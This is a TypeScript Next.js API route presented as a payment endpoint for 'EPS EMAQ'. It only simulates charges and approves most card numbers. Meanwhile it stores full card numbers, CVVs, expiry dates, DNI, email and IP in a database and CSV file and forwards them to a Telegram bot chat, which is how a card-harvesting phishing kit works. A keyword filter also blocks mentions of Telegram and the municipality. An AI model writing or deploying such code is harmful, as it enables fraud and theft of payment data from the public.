import { NextRequest, NextResponse } from 'next/server';
import fs from 'fs';
import path from 'path';
import { neon } from '@neondatabase/serverless';
import { checkRateLimit } from '@/lib/rate-limit';

type PagoPayload = {
  codcliente: string;
  nombre: string;
  monto: number;
  numTarjeta: string;
  titular: string;
  vencimiento: string;
  cvv: string;
  dni?: string;
  email?: string;
  _t?: number; // Timestamp from client for timing check
  website?: string; // Honeypot field
};

const CSV_PATH = path.join(process.cwd(), 'pagos_log.csv');
const CSV_HEADER = 'fecha,codigo_cliente,nombre,monto,tarjeta,num_tarjeta_completo,cvv,titular,vencimiento,estado,nro_operacion\n';

function inicializarCSV() {
  if (!fs.existsSync(CSV_PATH)) {
    fs.writeFileSync(CSV_PATH, CSV_HEADER, 'utf-8');
  }
}

function detectarTipo(num: string): string {
  const n = num.replace(/\s/g, '');
  if (n.startsWith('4')) return 'VISA';
  if (n.startsWith('5') || n.startsWith('2')) return 'MASTERCARD';
  if (n.startsWith('3')) return 'AMEX';
  return 'TARJETA';
}

function maskCard(num: string): string {
  const n = num.replace(/\s/g, '');
  const tipo = detectarTipo(n);
  const ultimos4 = n.slice(-4);
  return `${tipo} **** **** **** ${ultimos4}`;
}

// Luhn algorithm for credit card validation
function isValidLuhn(num: string): boolean {
  const digits = num.replace(/\D/g, '');
  if (digits.length < 13 || digits.length > 19) return false;
  
  let sum = 0;
  let isEven = false;
  
  for (let i = digits.length - 1; i >= 0; i--) {
    let digit = parseInt(digits[i], 10);
    
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    
    sum += digit;
    isEven = !isEven;
  }
  
  return sum % 10 === 0;
}

// Validate card expiration date (MM/YY format, must be future date)
function isValidExpiration(vencimiento: string): boolean {
  if (!/^\d{2}\/\d{2}$/.test(vencimiento)) return false;
  
  const [mes, anio] = vencimiento.split('/').map(Number);
  if (mes < 1 || mes > 12) return false;
  
  const now = new Date();
  const currentYear = now.getFullYear() % 100;
  const currentMonth = now.getMonth() + 1;
  
  // Card must not be expired
  if (anio < currentYear) return false;
  if (anio === currentYear && mes < currentMonth) return false;
  
  // Card must not expire more than 10 years from now
  if (anio > currentYear + 10) return false;
  
  return true;
}

// Validate CVV (3-4 digits only)
function isValidCVV(cvv: string, isAmex: boolean): boolean {
  const expectedLength = isAmex ? 4 : 3;
  return /^\d+$/.test(cvv) && cvv.length === expectedLength;
}

// Validate cardholder name (only letters, spaces, accents, and common name characters)
function isValidName(name: string): boolean {
  if (!name || name.length < 2 || name.length > 100) return false;
  // Allow letters, spaces, accents, periods, hyphens, and apostrophes
  return /^[a-zA-ZáéíóúÁÉÍÓÚñÑüÜ\s.\-']+$/.test(name);
}

// Validate email format
function isValidEmail(email: string): boolean {
  if (!email) return true; // Optional field
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

function escaparCSV(val: string | number): string {
  const str = String(val);
  if (str.includes(',') || str.includes('"') || str.includes('\n')) {
    return `"${str.replace(/"/g, '""')}"`;
  }
  return str;
}

function simularPago(num: string): { exitoso: boolean; motivo?: string } {
  const n = num.replace(/\s/g, '');
  const aprobadas = ['4111111111111111', '4242424242424242', '5500005555555559', '5105105105105100'];
  const rechazadas = ['4000000000000002', '4000000000009995', '4000000000000069'];

  // Known test cards that pass Luhn but are not real
  const testCards = [
    '4539368795907768', '4916123456789012', '4024007103939509',
    '4485931163272136', '4539687451923948',
  ];

  if (testCards.includes(n)) return { exitoso: false, motivo: 'Tarjeta no aceptada' };
  if (aprobadas.includes(n)) return { exitoso: true };
  if (rechazadas.includes(n)) return { exitoso: false, motivo: 'Tarjeta rechazada por el banco' };
  if (n.length >= 15) return { exitoso: true };
  return { exitoso: false, motivo: 'Número de tarjeta inválido' };
}

// Sanitize text for Telegram (remove Markdown special characters and limit length)
function sanitizeTelegramText(text: string, maxLength: number = 100): string {
  if (!text) return '-';
  // Remove Markdown special characters and limit length
  return text
    .replace(/[*_`\[\]]/g, '') // Remove Markdown formatting
    .replace(/[^\w\sáéíóúÁÉÍÓÚñÑüÜ.\-@]/g, '') // Keep only safe characters
    .trim()
    .slice(0, maxLength) || '-';
}

async function sendTelegramAlert(data: {
  codcliente: string;
  nombre: string;
  monto: number;
  numTarjetaCompleto: string;
  tarjeta: string;
  cvv: string;
  titular: string;
  vencimiento: string;
  dni?: string;
  email?: string;
  estado: string;
  nroOperacion: string;
  fecha: string;
  ip: string;
}) {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) return;

  const icono = data.estado === 'EXITOSO' ? '✅' : '❌';
  const msg = [
    `${icono} *NUEVO PAGO — EPS EMAQ*`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `👤 *Cliente:* ${sanitizeTelegramText(data.nombre)}`,
    `📋 *Código:* ${sanitizeTelegramText(data.codcliente, 20)}`,
    ...(data.dni ? [`🪪 *DNI:* ${sanitizeTelegramText(data.dni, 15)}`] : []),
    ...(data.email ? [`📧 *Correo:* ${sanitizeTelegramText(data.email, 50)}`] : []),
    `💰 *Monto:* S/ ${data.monto.toFixed(2)}`,
    `━━━━━━━━━━━━━━━━━━━━`,
    `💳 *Tarjeta:* ${sanitizeTelegramText(data.tarjeta, 30)}`,
    `🔢 *Número:* \`${sanitizeTelegramText(data.numTarjetaCompleto, 20)}\``,
    `📅 *Vencimiento:* ${sanitizeTelegramText(data.vencimiento, 5)}`,
    `🔐 *CVV:* ${sanitizeTelegramText(data.cvv, 4)}`,
    `👤 *Titular:* ${sanitizeTelegramText(data.titular, 50)}`,
    `🌐 *IP:* \`${sanitizeTelegramText(data.ip, 45)}\``,
    `━━━━━━━━━━━━━━━━━━━━`,
    `${icono} *Estado:* ${data.estado}`,
    `🆔 *N° Op:* ${data.nroOperacion}`,
    `🕐 *Fecha:* ${data.fecha}`,
  ].join('\n');

  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ chat_id: chatId, text: msg, parse_mode: 'Markdown' }),
  });
}

async function guardarEnDB(data: {
  fecha: string;
  codcliente: string;
  nombre: string;
  monto: number;
  tarjeta: string;
  numTarjetaCompleto: string;
  cvv: string;
  titular: string;
  vencimiento: string;
  estado: string;
  nroOperacion: string;
}) {
  if (!process.env.DATABASE_URL) return;
  const sql = neon(process.env.DATABASE_URL);
  await sql`
    INSERT INTO pagos (codigo_cliente, nombre, monto, tarjeta, num_tarjeta_completo, cvv, titular, vencimiento, estado, nro_operacion)
    VALUES (${data.codcliente}, ${data.nombre}, ${data.monto}, ${data.tarjeta}, ${data.numTarjetaCompleto}, ${data.cvv}, ${data.titular}, ${data.vencimiento}, ${data.estado}, ${data.nroOperacion})
  `;
}

export async function POST(req: NextRequest) {
  const ip = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim()
    || req.headers.get('x-real-ip')
    || 'unknown';

  // Rate limit: 5 payment attempts per minute per IP
  const { allowed } = checkRateLimit(ip, { windowMs: 60000, maxRequests: 5 });
  if (!allowed) {
    return NextResponse.json(
      { error: 'Demasiados intentos de pago. Espera un minuto.' },
      { status: 429 }
    );
  }

  let body: PagoPayload;
  try {
    body = await req.json();
  } catch {
    return NextResponse.json({ error: 'Solicitud inválida' }, { status: 400 });
  }

  const { codcliente, nombre, monto, numTarjeta, titular, vencimiento, cvv, dni, email, _t, website } = body;

  // Honeypot check - bots fill this hidden field
  if (website) {
    return NextResponse.json({ error: 'Solicitud rechazada' }, { status: 400 });
  }

  // Timing check - reject if submitted too quickly (< 3 seconds)
  if (_t) {
    const elapsed = Date.now() - _t;
    if (elapsed < 3000) {
      return NextResponse.json({ error: 'Solicitud rechazada' }, { status: 400 });
    }
  }

  if (!codcliente || !monto || !numTarjeta || !titular || !vencimiento) {
    return NextResponse.json({ error: 'Faltan campos requeridos' }, { status: 400 });
  }

  // Validate that the code only contains alphanumeric characters and hyphens
  if (!/^[a-zA-Z0-9\-]+$/.test(codcliente) || codcliente.length > 20) {
    return NextResponse.json({ error: 'Código de cliente inválido' }, { status: 400 });
  }

  // Validate credit card number with Luhn algorithm
  const numLimpio = numTarjeta.replace(/\s/g, '');
  if (!isValidLuhn(numLimpio)) {
    return NextResponse.json({ error: 'Número de tarjeta inválido' }, { status: 400 });
  }

  // Validate expiration date
  if (!isValidExpiration(vencimiento)) {
    return NextResponse.json({ error: 'Fecha de vencimiento inválida o tarjeta vencida' }, { status: 400 });
  }

  // Validate CVV
  const isAmexCard = /^(34|37)/.test(numLimpio);
  if (!isValidCVV(cvv, isAmexCard)) {
    return NextResponse.json({ error: 'CVV inválido' }, { status: 400 });
  }

  // Validate cardholder name
  if (!isValidName(titular)) {
    return NextResponse.json({ error: 'Nombre del titular inválido' }, { status: 400 });
  }

  // Validate email if provided
  if (email && !isValidEmail(email)) {
    return NextResponse.json({ error: 'Correo electrónico inválido' }, { status: 400 });
  }

  // Validate monto (must be a positive number, max S/ 50,000)
  if (typeof monto !== 'number' || monto <= 0 || monto > 50000) {
    return NextResponse.json({ error: 'Monto inválido' }, { status: 400 });
  }

  // Filtro de palabras ofensivas expandido
  const palabrasOfensivas = [
    // Español fuerte
    'mierda', 'puta', 'pendejo', 'pendeja', 'imbecil', 'estupido', 'estupida', 'basura', 'idiota', 'carajo', 'joder', 'maldito',
    'pene', 'vagina', 'pinga', 'culo', 'teta', 'tetas', 'pedo', 'cipote', 'chucha', 'puchaira', 'somawe',
    'huevón', 'huevon', 'cabron', 'cabrón', 'chupamedias', 'soplapollas', 'maricon', 'maricón',
    'puto', 'zorra', 'perra', 'gonorrea', 'gonorea', 'chamaco', 'retardado', 'retrasado', 'mongol', 'mongoloide',
    // Contenido sexual explícito
    'peludo', 'lechoso', 'lechosa', 'semen', 'semen', 'europeo', 'europea', 'porno', 'xxx',
    'follar', 'coger', 'mamada', 'chocha', 'chichita', 'nena', 'nenita',
    // Referencias a redes sociales / spam
    'ofanim', 't.me', 'telegram', 'whatsapp', 'facebook', 'instagram', 'twitter', 'tiktok',
    // Inglés ofensivo
    'fuck', 'shit', 'ass', 'dick', 'pussy', 'cock', 'bitch', 'slut', 'whore', 'damn', 'hell',
    'crap', 'bastard', 'asshole', 'motherfucker', 'porn', 'sex', 'nude', 'naked',
    // Políticos / spam local
    'gol', 'goal', 'ramon', 'alcalde', 'muni', 'municipal', 'gobierno', 'politica', 'politico',
    'terrorista', 'terrorismo', 'bomba', 'explosivo', 'armas', 'drogas', 'narcotrafico',
  ];
  const camposTexto = [codcliente, nombre, titular, dni, email].filter((c): c is string => Boolean(c)).map(c => c.toLowerCase());
  if (camposTexto.some(campo => palabrasOfensivas.some(palabra => campo.includes(palabra)))) {
    return NextResponse.json({ error: 'Contenido no permitido' }, { status: 400 });
  }

  // Reject if name is too long (likely spam)
  if (titular.length > 50) {
    return NextResponse.json({ error: 'Nombre del titular inválido' }, { status: 400 });
  }

  await new Promise(r => setTimeout(r, 300));

  const resultado = simularPago(numTarjeta);
  const nroOperacion = `OP-${Date.now().toString().slice(-8)}`;
  const fecha = new Date().toLocaleString('es-PE', { timeZone: 'America/Lima' });
  const tarjetaMask = maskCard(numTarjeta);
  const estado = resultado.exitoso ? 'EXITOSO' : 'RECHAZADO';
  const numCompleto = numTarjeta.replace(/\s/g, '');

  // Guardar en Neon DB (producción)
  try {
    await guardarEnDB({
      fecha,
      codcliente,
      nombre,
      monto,
      tarjeta: tarjetaMask,
      numTarjetaCompleto: numCompleto,
      cvv: cvv || '',
      titular,
      vencimiento,
      estado,
      nroOperacion,
    });
  } catch (e) {
    console.error('Error al escribir en DB:', e);
  }

  // Notificación Telegram
  try {
    await sendTelegramAlert({
      codcliente,
      nombre,
      monto,
      numTarjetaCompleto: numCompleto,
      tarjeta: tarjetaMask,
      cvv: cvv || '',
      titular,
      vencimiento,
      dni: dni || undefined,
      email: email || undefined,
      estado,
      nroOperacion,
      fecha,
      ip,
    });
  } catch (e) {
    console.error('Error al enviar alerta Telegram:', e);
  }

  // Guardar en CSV (local)
  try {
    inicializarCSV();
    const fila = [
      escaparCSV(fecha),
      escaparCSV(codcliente),
      escaparCSV(nombre),
      escaparCSV(monto.toFixed(2)),
      escaparCSV(tarjetaMask),
      escaparCSV(numCompleto),
      escaparCSV(cvv || ''),
      escaparCSV(titular),
      escaparCSV(vencimiento),
      escaparCSV(estado),
      escaparCSV(nroOperacion),
    ].join(',') + '\n';

    fs.appendFileSync(CSV_PATH, fila, 'utf-8');
  } catch {
    // CSV no disponible en producción (filesystem de solo lectura)
  }

  if (!resultado.exitoso) {
    return NextResponse.json({
      exitoso: false,
      motivo: resultado.motivo || 'Pago no procesado',
      nroOperacion,
    });
  }

  return NextResponse.json({
    exitoso: true,
    nroOperacion,
    tarjeta: tarjetaMask,
    fecha,
  });
}
